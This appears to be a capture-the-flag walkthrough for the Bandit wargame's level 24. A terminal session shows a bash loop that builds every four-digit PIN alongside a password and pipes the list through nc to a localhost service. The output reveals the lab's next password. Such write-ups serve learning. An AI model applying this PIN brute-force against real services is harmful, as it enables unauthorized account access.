## bandit24

```bash
bandit24@bandit~$ mktemp -d
/tmp/tmp.TrDf0Jdwa4
bandit24@bandit:/tmp/tmp.TrDf0Jdwa4$ nano brutefroce.sh
#!/bin/bash

for i in {9999..000}
do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"
done
bandit24@bandit:/tmp/tmp.TrDf0Jdwa4$ chmod +x brutefroce.sh
bandit24@bandit:/tmp/tmp.TrDf0Jdwa4$ ./brutefroce.sh > passlist.txt
bandit24@bandit:/tmp/tmp.TrDf0Jdwa4$ ls
brutefroce.sh  passlist.txt
bandit24@bandit:/tmp/tmp.TrDf0Jdwa4$ cat passlist.txt | nc localhost 30002
Correct!
The password of user bandit25 is p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d
Exiting.
```
